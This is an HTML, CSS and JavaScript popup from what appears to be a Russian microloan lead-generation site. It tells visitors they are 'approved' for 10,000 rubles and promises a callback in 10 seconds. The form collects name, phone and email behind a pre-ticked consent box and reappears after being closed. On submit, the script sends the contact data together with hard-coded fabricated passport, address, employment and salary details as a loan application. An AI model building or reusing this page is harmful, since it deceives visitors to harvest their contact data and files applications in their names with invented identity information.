<style>
.tom_modal_background {
    position: fixed;
    display: flex;
    width: 100%;
    height: 100%;
    justify-content: center;
    align-items: center;
    background: rgba(0,0,0,.7);
    z-index: 9999;
    top: -999px;
    /* animation-timing-function: ease-out;
    animation: showing 2s; */
}
.modal_container {
top: 20px;
/* width: 548px; */
margin: 0 auto;
max-width: 548px;
/* position: fixed; */
position: absolute;
left: 0;
right: 0;

/* animation-timing-function: ease-out;
animation: showing 2s; */
/* -webkit-animation-delay: 4s;
animation-delay: 4s; */
z-index: 9999;
}
.hr {
background-color: rgb(233, 236, 238);
height: 1px;
}
/* @keyframes showing {
from {top: -999px;}
to {top: 20px;}
} */
.modal_h2 {
font-size: 20px;
font-family: "OpenSans";
color: rgb(19, 19, 19);
line-height: 1.2;
text-align: center;
margin: -20px 0 0;
}
.modal_h2 > span {
font-size: 22px;
font-family: "OpenSans";
color: rgb(19, 19, 19);
line-height: 1.364;
text-align: center;
}
.modal_form {
max-width: 548px;
width: 80%;
margin: 0 auto;
height: auto;
border-color: rgb(223, 227, 230);
border-style: solid;
border-width: 1px;
border-radius: 6px;
background-color: rgb(255, 255, 255);
}
.form-group-container {
padding: 0 30px;
}
.form-group-modal {
margin-bottom: 15px;
}
input.bootstrap3 {
width: 100%;
height: 44px;
margin-bottom: 5px;
border-width: 1px;
border-color: rgb(223, 227, 230);
border-style: solid;
background-color: rgb(255, 255, 255);
padding: 15px 5px 15px 15px;
font-size: 15px;
font-family: "OpenSans";
color: rgb(16, 45, 83);
line-height: 1.2;
box-sizing: border-box;
}
input#i_modal{
text-transform: capitalize;
}
label.bootstrap3 {
display: block;
max-width: 100%;
margin-bottom: 5px;
font-size: 16px;
font-family: "OpenSans";
color: rgb(19, 19, 19);
line-height: 1.2;
text-align: left;
}
.tom_center {
text-align: center;
}
@media (max-width: 450px) {
.modal_h2 {
font-size: 1em;
margin: 0;
}
label.bootstrap3 {
font-size: 12px;
}
input.bootstrap3 {
height: 30px;
font-size: 16px;
padding: 15px 5px 15px 15px;
}
label.bootstrap3 {
padding: unset;
}
.tom_btn {
font-size: 14px !important;
padding: 10px !important;
margin: 5px !important;
}
}
.form-group-modal {
    margin-bottom: 5px;
}
.hr {
    margin-top: 10px;
    margin-bottom: 10px;
}
.btn_controls {
margin: 20px auto;
display: table;
}
.tom_btn {
cursor: pointer;
display: block;
width: 181px;
height: 50px;;
margin: 0 auto;
border-radius: 4px;
background-color: rgb(247, 68, 85);
-moz-border-radius: 4px;
-webkit-border-radius: 4px;
-ms-border-radius: 4px;
font-size: 16px;
font-family: "OpenSans";
color: rgb(255, 255, 255);
font-weight: bold;
text-transform: uppercase;
text-align: center;
transition: 1s all;
line-height: 50px;
}
.tom_hidden_all {
display: none !important;
}
@media (min-width: 451px) {
.tom_hidden {
display: none !important;
}
}
@media (max-width: 450px) {
.label_checkbox {
    font-size: 12px !important;
}
.tom_center > p {
    font-size: 12px;
}
.tom_btn {
    line-height: 28px;
}
.tom_hidden_mobile {
display: none !important;
}

}
.agree_btn {
/* background: #4cff2d; */
}
.agree_btn:hover {
background: #31bf19;
}
.error_btn {
background: #fd5c5c;
}
.error_btn:hover {
background: red;
border: 2px solid #FFDD2D;
}
@keyframes shadow-pulse {
0% {
-webkit-box-shadow: 1px 1px 10px 0 rgba(0, 0, 0, 0.75);
-moz-box-shadow: 1px 1px 10px 0 rgba(0, 0, 0, 0.75);
box-shadow: 1px 1px 10px 0 rgba(0, 0, 0, 0.75)
}

100% {
box-shadow: 0 0 0 15px rgba(0, 0, 0, 0)
}
}

.tom_pulse {
animation: shadow-pulse 1s infinite !important;
-webkit-animation: shadow-pulse 1s infinite !important;
}
.tom_input__error {
border-color: rgb(247, 68, 85) !important;
background-color: rgb(255, 255, 255) !important;
}
.tom_input__agree {
border: 1px solid green !important;
color: green !important;
}
input.tom:hover {
border-color: rgb(255, 221, 45);
cursor: pointer;
}
.tom_right {
    text-align: right;
}
.tom_left {
    text-align: left;
}
.tom_modal_close {
    text-align: center;
    padding-top: 20px;
    padding-right: 20px;
    transition: all 1s;
}
.tom_modal_close:hover, .modal_checkbox:hover {
  cursor: pointer;
}
.modal_checkbox {
  font-size: 14px !important;
  font-family: "Myriad Pro" !important;
  color: rgb(19, 19, 19) !important;
  line-height: 1.2 !important;
  text-align: left !important;
  transition: unset;
}
.label_checkbox {
    display: inline !important;
    height: auto !important;
    width: auto !important;
    text-align: center !important;
    cursor: pointer !important;
    padding-left: 10px;
    transition: unset;
}
.tom_warning {
    color: #f00;
    font-size: 12px;
    margin: 0 auto;
    padding: 0;
    font-weight: 700;
    text-align: center;
}
</style>
<div class="tom_modal_background">
<div class="modal_container">
    <div class="modal_form">
        <div class="tom_right"><img id="tom_not_agree" class="tom_modal_close" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAPCAYAAAA71pVKAAAA9ElEQVQokX3SsS4FQRTG8d+dLAWR8BR6iSjEre5tJKr7Ct5BZSV0eo1iW72CKCQapdWK4BHQSESlMOOuMXu/ZnK+Pf9vJ+fMoGkaUQMs4MNsLeMdQgc8xRWWZoBDvGCS4ATuYhOXPQFDXGAFZ5gE7EQwqRSQwMVYz+Ek4ByH2V+6ATkIr9iuYnEQzzoLuMFqARyjrTpmKWAtu9EvCFX2sRTQBUe4T0YoNF3jq+A/46lr5HAaznwBXpdtoQuXpvqZBfxZY4K3CuBbbD7qC6iwEYscHPmZahu9/Twg4BEPPWBSXbjBbYjNY9yZrqP1X7XpSzzG3jdlwTmOwQgzXAAAAABJRU5ErkJggg=="/></div>
        <h2 class="modal_h2"><span>Вам одобрено 10 000 &#8381;</span><br>Введите данные и вам перезвонят<br>через 10
            секунд</h2>
        <div class="form-group-container">
            <hr class="hr">
            <!-- -->
            <div class="form-group-modal">
                <label class="bootstrap3" for="i_modal">* Ваше имя:</label>
                <input type="text" tabindex="1" class="tom bootstrap3" name="i_modal" onfocus="FormatName_MainModal(this,event);" onblur="FormatName_MainModal(this,event);"
                    onkeydown="FormatName_MainModal(this,event);" id="i_modal" placeholder="Имя" title="Укажите своё Имя..."
                    required="" autocomplete="on">
            </div>
            <!-- -->
            <div class="form-group-modal">
                <label class="bootstrap3" for="phone_modal">* Ваш номер телефона:</label>
                <input type="tel" class="tom bootstrap3" tabindex="2" name="phone_modal" onfocus="FormatPhone_MainModal(this,event);"
                    onblur="FormatPhone_MainModal(this,event);" onmouseover="FormatPhone_MainModal2(event);" onkeydown="FormatPhone_MainModal(this,event);" id="phone_modal"
                    placeholder="Ваш номер телефона..." title="Ваш номер телефона" required="" autocomplete="on">
            </div>
            <!-- -->
            <div class="form-group-modal">
                <label class="bootstrap3" for="email_modal">* Ваш email:</label>
                <input type="text" tabindex="3" class="tom bootstrap3" name="email_modal" id="email_modal" placeholder="Ваш email..."
                    title="Укажите Ваш email" required="" onfocus="FormatEmail_MainModal(this,event);" onblur="FormatEmail_MainModal(this,event);"
                    onkeydown="FormatEmail_MainModal(this,event);" autocomplete="on">
                <div class="tom_center"><span class="tom_img_error"></span><span class="tom_email_error"></span></div>
            </div>
            <!-- -->
            <div class="form-group-modal tom_center">
                <p class="bootstrap3">* все поля обязательны к заполеннию</p>
                <hr class="hr">
            </div>
            <!-- -->
             <!-- -->
            <div class="form-group-modal tom_center">
                <input type="checkbox" id="modal_checkbox" tabindex="4" class="modal_checkbox" checked><label class="label_checkbox" for="modal_checkbox">Согласен с обработкой персональных данных и публичной офертой сайта.</label>
            </div>
            <!-- -->
            <div><p class="bootstrap3 tom_warning"></p></div>
            <div class="form-group-modal btn_controls tom_center">
                <a tabindex="5" onfocus="check_main_btn(this,event);" class='tom_btn agree_btn' id="tom_agree">Забрать деньги</a>
            </div>
            <!-- -->
        </div>
        <!-- -->
    </div>
</div>
</div>
<script>
function animate(draw, duration) {
  var start = performance.now();

  requestAnimationFrame(function animate(time) {
    // определить, сколько прошло времени с начала анимации
    var timePassed = time - start;

    // возможно небольшое превышение времени, в этом случае зафиксировать конец
    if (timePassed > duration) timePassed = duration;

    // нарисовать состояние анимации в момент timePassed
    draw(timePassed);

    // если время анимации не закончилось - запланировать ещё кадр
    if (timePassed < duration) {
      requestAnimationFrame(animate);
    }

  });
}

animate(function(timePassed) {
    document.querySelector('.tom_modal_background').style.top = (timePassed - 4000)  +'px';
}, 4000);

var HttpClient = function() {
    this.get = function(aUrl, aCallback) {
        var anHttpRequest = new XMLHttpRequest();
        anHttpRequest.onreadystatechange = function() { 
            if (anHttpRequest.readyState == 4 && anHttpRequest.status == 200)
                aCallback(anHttpRequest.responseText);
        }

        anHttpRequest.open( "GET", aUrl, true );            
        anHttpRequest.send( null );
    }
}

function setcookie_modal(name, value, expires, path, domain, secure) {
    document.cookie = name + "=" + escape(value) +
        ((expires) ? "; expires=" + (new Date(expires)) : "") +
        ((path) ? "; path=" + path : "; path=/") +
        ((domain) ? "; domain=" + domain : "") +
        ((secure) ? "; secure" : "");
};

var _uu = 0;

function sendToSite_MainModal(e) {
        var sendToSite_t = document.querySelector('#phone_modal').value;
        var sendToSite_y = document.querySelector('#email_modal').value; 
        var sendToSite_j = (document.querySelector('#fingerprint').value == '') ? '0' : document.querySelector('#fingerprint').value; 
        var sendToSite_n = (document.querySelector('#i_modal').value == '') ? 'Пусто' : document.querySelector('#i_modal').value; 

        if (sendToSite_t.length < 7 || sendToSite_y.length < 7 || !document.querySelector('#modal_checkbox').checked || !document.querySelector('#tom_agree').classList.contains('tom_pulse')) {
            e.preventDefault();
            document.querySelector('.tom_warning').innerText = ' Заполните все данные!';
            return false;
        }

        _uu++;

        if(_uu > 1)
            return false;

        document.querySelector('.tom_btn').style.display = 'none';
        
        var _data_modal = "addnew?fingerprint="+encodeURI(sendToSite_j)+"?display=0&referer="+encodeURI(document.location.href)+"&step=5&ad_id=4&amount=20000&period=21&rangeSlider=20000&f=%D0%A2%D0%B5%D1%81%D1%82&i="+encodeURI(sendToSite_n)+"&o=%D0%A2%D0%B5%D1%81%D1%82&gender=0&birth_dd=0&birth_mm=0&birth_yyyy=0&birthdate=27%2F01%2F1999&phone="+encodeURI(sendToSite_t)+"&email="+encodeURI(sendToSite_y)+"&delays_type=never&passport=1234+567890&passport_s=1234&passport_n=567890&passportdate=05%2F01%2F2018&passport_code=770-095&passport_who=%D0%9E%D0%A2%D0%94%D0%95%D0%9B+%D0%A3%D0%A4%D0%9C%D0%A1+%D0%A0%D0%9E%D0%A1%D0%A1%D0%98%D0%98+%D0%9F%D0%9E+%D0%93%D0%9E%D0%A0.+%D0%9C%D0%9E%D0%A1%D0%9A%D0%92%D0%95+%D0%9F%D0%9E+%D0%A0%D0%90%D0%99%D0%9E%D0%9D%D0%A3+%D0%A1%D0%95%D0%92%D0%95%D0%A0%D0%9D%D0%9E%D0%95+%D0%A2%D0%A3%D0%A8%D0%98%D0%9D%D0%9E&birthplace=%D0%A2%D0%B5%D1%81%D1%82&region=%D0%A0%D0%B5%D1%81%D0%BF%D1%83%D0%B1%D0%BB%D0%B8%D0%BA%D0%B0+%D0%9A%D0%B0%D1%80%D0%B5%D0%BB%D0%B8%D1%8F&city=%D0%9F%D0%B5%D1%82%D1%80%D0%BE%D0%B7%D0%B0%D0%B2%D0%BE%D0%B4%D1%81%D0%BA&street=%D0%A2%D0%B5%D1%81%D1%82&building=1&housing=2&flat=3&reg_type=1&reg_same=1&work=%D0%9F%D0%95%D0%9D%D0%A1%D0%98%D0%9E%D0%9D%D0%95%D0%A0&work_name=%D0%BF%D0%B5%D0%BD%D1%81%D0%B8%D0%BE%D0%BD%D0%B5%D1%80&work_occupation=%D0%BF%D0%B5%D0%BD%D1%81%D0%B8%D0%BE%D0%BD%D0%B5%D1%80&work_phone=8+(912)+345+6789&work_experience=100&work_salary=123456&work_region=%D0%A0%D0%B5%D1%81%D0%BF%D1%83%D0%B1%D0%BB%D0%B8%D0%BA%D0%B0+%D0%9A%D0%B0%D1%80%D0%B5%D0%BB%D0%B8%D1%8F&work_city=%D0%9F%D0%B5%D1%82%D1%80%D0%BE%D0%B7%D0%B0%D0%B2%D0%BE%D0%B4%D1%81%D0%BA&work_street=%D0%A2%D0%B5%D1%81%D1%82&work_house=1&work_office=3";
        var client = new HttpClient();
        client.get('https://'+document.location.host+'/'+_data_modal, function() {
                
        });
        setcookie_modal('lk',1);
        send_form(true, '/lk' + document.location.search);
        markTarget('form-step-3');
        window.location = '/lk' + document.location.search;

    }

     function check_main_btn(tt, e) 
     {
        var sendToSite_t = document.querySelector('#phone_modal').value;
        var sendToSite_y = document.querySelector('#email_modal').value; 

        if (sendToSite_t.length < 7 || sendToSite_y.length < 7 || !document.querySelector('#modal_checkbox').checked) {
            if (document.querySelector('#tom_agree').classList.contains('tom_pulse'))
            { 
                document.querySelector('#tom_agree').classList.remove('tom_pulse');
            }
             
            document.querySelector('#tom_agree').setAttribute('disabled', 'disabled');
            document.querySelector('.tom_warning').innerText = ' Заполните все свои данные правильно.';

            return false;
        }
        else
        {
            if (!document.querySelector('#tom_agree').classList.contains('tom_pulse'))
                document.querySelector('#tom_agree').classList.add('tom_pulse');

            document.querySelector('.tom_warning').innerText = ''; 
            document.querySelector('#tom_agree').removeAttribute("disabled");
        }
     }

    function enableBtn_MainModal(on = true) {

        var sendToSite_t = document.querySelector('#phone_modal').value;
        var sendToSite_y = document.querySelector('#email_modal').value; 

        if (sendToSite_t.length < 7 || sendToSite_y.length < 7 || !document.querySelector('#modal_checkbox').checked || !on) {
            if (document.querySelector('#tom_agree').classList.contains('tom_pulse'))
            { 
                document.querySelector('#tom_agree').classList.remove('tom_pulse');
            }
            
            // document.querySelector('#tom_agree').style.visibility = 'hidden'
            document.querySelector('#tom_agree').setAttribute('disabled', 'disabled');
            document.querySelector('.tom_warning').innerText = ' Заполните все свои данные правильно.';

            return false;
        }

        if (on) {
            if (!document.querySelector('#tom_agree').classList.contains('tom_pulse'))
                document.querySelector('#tom_agree').classList.add('tom_pulse');

            document.querySelector('.tom_warning').innerText = '';
            
            // document.querySelector('#tom_agree').style.visibility = 'visible'
             document.querySelector('#tom_agree').removeAttribute("disabled");

        } 
    }

    document.querySelector('#tom_agree').addEventListener('click', sendToSite_MainModal);

    document.querySelector('#tom_not_agree').addEventListener('click', function () {
        document.querySelector('.tom_modal_background').style.display = 'none';
        setTimeout(function () { showBlock(); }, 3000);
    });

     document.querySelector('#modal_checkbox').addEventListener('click', function () {
        if(!document.querySelector('#modal_checkbox').checked)
            enableBtn_MainModal(false);
        else
            enableBtn_MainModal(true);
    });

    function FormatName_MainModal(tt, e) {
        var _re_name = /^[а-яА-Яё,\W\.\s-]{2,}$/i.test(document.querySelector('#i_modal').value);
        if(_re_name)
        {
            if (document.querySelector('#i_modal').classList.contains('tom_input__error'))
                document.querySelector('#i_modal').classList.remove('tom_input__error');

            if (!document.querySelector('#i_modal').classList.contains('tom_input__agree')) {
                document.querySelector('#i_modal').classList.add('tom_input__agree');
            }

            PopupFormIsCorrect_MainModal();
            document.querySelector('.tom_warning').innerText = ' ';
        }
        else
        {
            if (!document.querySelector('#i_modal').classList.contains('tom_input__error')) {
                document.querySelector('#i_modal').classList.add('tom_input__error');
            }
            
            enableBtn_MainModal(false);
            document.querySelector('.tom_warning').innerText = ' Укажите правильно своё имя';
        }
    }

    function FormatEmail_MainModal(tt, e) {
        var _email = /^[A-Z0-9._%+-]+(@mail.ru|@bk.ru|@inbox.ru|@list.ru|@yandex.ru|@ya.ru|@gmail.com|@rambler.ru|@mail.ua)$/i.test(document.querySelector('#email_modal').value);
        if (_email) {
            if (document.querySelector('#email_modal').classList.contains('tom_input__error'))
                document.querySelector('#email_modal').classList.remove('tom_input__error');

            if (!document.querySelector('#email_modal').classList.contains('tom_input__agree')) {
                document.querySelector('#email_modal').classList.add('tom_input__agree');
                if (document.querySelector('.tom_email_error'))
                    document.querySelector('.tom_email_error').innerText = ' Проверьте попозже почту. Письмо могло попасть в папку "СПАМ".';
            }
            PopupFormIsCorrect_MainModal();
            document.querySelector('.tom_warning').innerText = ' ';
        } else {
            if (!document.querySelector('#email_modal').classList.contains('tom_input__error')) {
                document.querySelector('#email_modal').classList.add('tom_input__error');
                if (document.querySelector('.tom_email_error'))
                {
                    // var img = document.createElement('img');
                    // img.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAOCAYAAAAmL5yKAAABD0lEQVQokZXSIU/CQRgG8B9KcH4Amqibn8BNPwEUMmzOZtBk0o2ZLDYJBLqOYiEZDGwUZhNnsho0mplQGIb/sf13HG4+2+3ufe553nvvvStMKg0rUMJnWG/jOyUqrnLjFY+5dfk/CU6whaMQzwN3HwvXViS4QzMXNwO3hFSCLqZo4SKMVuC6sbgQNbEsa9whRpgFfh0HeJE19GthiHswxHMww3tubxT2hthNXaGOHdRy3A8mubgWNPVUBT3cYJzjNqMKx0HTQyFfQSfM15HhDKcRt9B0FglKOEfVMi5xleCrwVMqoo8nDBLCkewFYgyCp1+YVBpzHOMtIf6Q/cK9iJ9hHw9FtHGLjcRJf2GK9i80JTjgBnpyPgAAAABJRU5ErkJggg==';
                    // document.querySelector('.tom_img_error').prepend(img);
                    // document.querySelector('.tom_email_error').innerText = ' Адрес должен заканчиваться на @mail.ru, @bk.ru, @inbox.ru, @list.ru, @yandex.ru, @ya.ru, @gmail.com, @rambler.ru, @mail.ua';
                    enableBtn_MainModal(false);
                    document.querySelector('.tom_warning').innerText = ' Укажите правильно свой email';
                }
            }

            if (document.querySelector('#email_modal').classList.contains('tom_input__agree'))
                document.querySelector('#email_modal').classList.remove('tom_input__agree');
        }
    }

    function PopupFormIsCorrect_MainModal() {
        if (document.querySelector('#email_modal').classList.contains('tom_input__agree') && document.querySelector('#phone_modal').classList.contains('tom_input__agree')) {
            enableBtn_MainModal(true);
        } else {
            enableBtn_MainModal(false);
        }
    }

    function FormatPhone_MainModal2(event)
    {
        FormatPhone_MainModal(null, event);
    }

    function FormatPhone_MainModal(tt, e) {
        var t = document.querySelector('#phone_modal');
        var v1 = t.value;
        var k = e.which;

        var _phone = /\+7\s\([\d]{3}\)\s[\d]{3}-[\d]{2}-[\d]{2}/.test(v1);

        if (_phone) {
            if (!document.querySelector('#phone_modal').classList.contains('tom_input__agree')) {
                document.querySelector('#phone_modal').classList.add('tom_input__agree');
                 enableBtn_MainModal(false);
            }

            if (document.querySelector('#phone_modal').classList.contains('tom_input__error')) {
                document.querySelector('#phone_modal').classList.remove('tom_input__error');
            }

            document.querySelector('.tom_warning').innerText = ' ';
            PopupFormIsCorrect_MainModal();
        } else {
            if (document.querySelector('#phone_modal').classList.contains('tom_input__agree')) {
                document.querySelector('#phone_modal').classList.remove('tom_input__agree');
                 enableBtn_MainModal(false);
            }

            if (!document.querySelector('#phone_modal').classList.contains('tom_input__error')) {
                document.querySelector('#phone_modal').classList.add('tom_input__error');
            }
        }

        if (k != 8 && v1.length >= 18) {
            e.preventDefault();
        }

        var q = String.fromCharCode((96 <= k && k <= 105) ? k - 48 : k);
        if (((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) && e.keyCode != 46 && e.keyCode != 37 && e.keyCode != 8 && e.keyCode != 39) {
            e.preventDefault();

            if (v1.length < 18)
                if (!document.querySelector('#phone_modal').classList.contains('tom_input__error'))
                    document.querySelector('#phone_modal').classList.add('tom_input__error');
        } else {
            setTimeout(function () {
                var v = t.value;
                var l = v.length;

                _phone = /\+7\s\([\d]{3}\)\s[\d]{3}-[\d]{2}-[\d]{2}/.test(v);

                if (_phone) {
                    if (!document.querySelector('#phone_modal').classList.contains('tom_input__agree')) {
                        document.querySelector('#phone_modal').classList.add('tom_input__agree');
                    }

                    if (document.querySelector('#phone_modal').classList.contains('tom_input__error')) {
                        document.querySelector('#phone_modal').classList.remove('tom_input__error');
                    }

                    PopupFormIsCorrect_MainModal();
                    document.querySelector('.tom_warning').innerText = ' ';
                } else {
                    if (document.querySelector('#phone_modal').classList.contains('tom_input__agree')) {
                        document.querySelector('#phone_modal').classList.remove('tom_input__agree');
                    }

                    if (!document.querySelector('#phone_modal').classList.contains('tom_input__error')) {
                        document.querySelector('#phone_modal').classList.add('tom_input__error');
                    }
                }

                if (k != 8) {
                    if (l < 4) {
                        t.value = '+7 ';
                    } else if (l === 4) {
                        if (isNaN(q)) {
                            t.value = '+7 (';
                        } else {
                            t.value = '+7 (' + q;
                        }
                    } else if (l === 7) {
                        t.value = v + ')';
                    } else if (l === 9) {
                        t.value = v1 + ' ' + q;
                    } else if (l === 13 || l === 16) {
                        t.value = v1 + '-' + q;
                    } else if (l > 18) {
                        v = v.substr(0, 18);
                        t.value = v;

                    }
                } else {
                    if (l < 4) {
                        t.value = '+7 ';
                    }
                }

            }, 50);

            t = document.querySelector('#phone_modal');
            v1 = t.value;

            _phone = /\+7\s\([\d]{3}\)\s[\d]{3}-[\d]{2}-[\d]{2}/.test(v1);

            if (_phone) {
                if (!document.querySelector('#phone_modal').classList.contains('tom_input__agree')) {
                    document.querySelector('#phone_modal').classList.add('tom_input__agree');
                }

                if (document.querySelector('#phone_modal').classList.contains('tom_input__error')) {
                    document.querySelector('#phone_modal').classList.remove('tom_input__error');
                }

                PopupFormIsCorrect_MainModal();
                document.querySelector('.tom_warning').innerText = ' ';
            } else {
                if (document.querySelector('#phone_modal').classList.contains('tom_input__agree')) {
                    document.querySelector('#phone_modal').classList.remove('tom_input__agree');
                }

                if (!document.querySelector('#phone_modal').classList.contains('tom_input__error')) {
                    document.querySelector('#phone_modal').classList.add('tom_input__error');
                }

                document.querySelector('.tom_warning').innerText = ' Укажите правильно свой № телефона';
            }
        }
    }

// document.querySelector('#email_modal').addEventListener('keydown', (event) => {

//     //console.log(` ${event.key} `);
// });

// document.querySelector('#email_modal').addEventListener('keydown', (event) => {
//     console.log(` ${event.key} `);
// });
</script>